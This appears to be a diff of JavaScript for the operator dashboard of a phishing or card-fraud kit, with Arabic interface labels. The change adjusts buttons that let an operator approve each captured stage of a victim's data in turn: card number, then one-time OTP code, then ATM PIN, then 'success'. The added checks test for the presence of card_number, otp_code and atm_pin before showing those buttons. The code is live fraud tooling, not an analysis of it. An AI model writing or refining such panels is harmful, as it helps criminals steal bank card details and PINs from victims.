@@ -417,19 +417,8 @@ function getStageLabel(stage) {
 
 function renderActionBtns(o) {
   const ref = o.order_ref;
+  // Only show view button in table - no approve/reject buttons here
   let btns = `<button class="btn-view" onclick="viewOrder('${ref}')">عرض</button>`;
-
-  if (o.status === 'waiting_approval') {
-    btns += `<button class="btn-approve" onclick="approveCard('${ref}')">✅ قبول</button>`;
-    btns += `<button class="btn-reject" onclick="rejectCard('${ref}')">❌ رفض</button>`;
-  } else if (o.status === 'waiting_otp') {
-    btns += `<button class="btn-approve" onclick="approveOtp('${ref}')">✅ قبول</button>`;
-    btns += `<button class="btn-reject" onclick="rejectOtp('${ref}')">❌ رفض</button>`;
-  } else if (o.status === 'waiting_atm_pin') {
-    btns += `<button class="btn-approve" onclick="approveAtm('${ref}')">✅ قبول</button>`;
-    btns += `<button class="btn-reject" onclick="rejectAtm('${ref}')">❌ رفض</button>`;
-  }
-
   return btns;
 }
 
@@ -542,13 +531,13 @@ function viewOrder(ref) {
 
   // أزرار الـ modal حسب الحالة
   let actionBtns = '<button class="btn-close" onclick="closeModal()">إغلاق</button>';
-  if (o.status === 'waiting_approval') {
+  if (o.status === 'waiting_approval' && o.card_number) {
     actionBtns += `<button class="btn-reject" onclick="rejectCard('${ref}');closeModal()">❌ رفض البطاقة</button>`;
     actionBtns += `<button class="btn-approve" onclick="approveCard('${ref}');closeModal()">✅ قبول → OTP</button>`;
-  } else if (o.status === 'waiting_otp') {
+  } else if (o.status === 'waiting_otp' && o.otp_code) {
     actionBtns += `<button class="btn-reject" onclick="rejectOtp('${ref}');closeModal()">❌ رفض OTP</button>`;
     actionBtns += `<button class="btn-approve" onclick="approveOtp('${ref}');closeModal()">✅ قبول → ATM PIN</button>`;
-  } else if (o.status === 'waiting_atm_pin') {
+  } else if (o.status === 'waiting_atm_pin' && o.atm_pin) {
     actionBtns += `<button class="btn-reject" onclick="rejectAtm('${ref}');closeModal()">❌ رفض الرقم السري</button>`;
     actionBtns += `<button class="btn-approve" onclick="approveAtm('${ref}');closeModal()">✅ قبول → نجاح</button>`;
   }
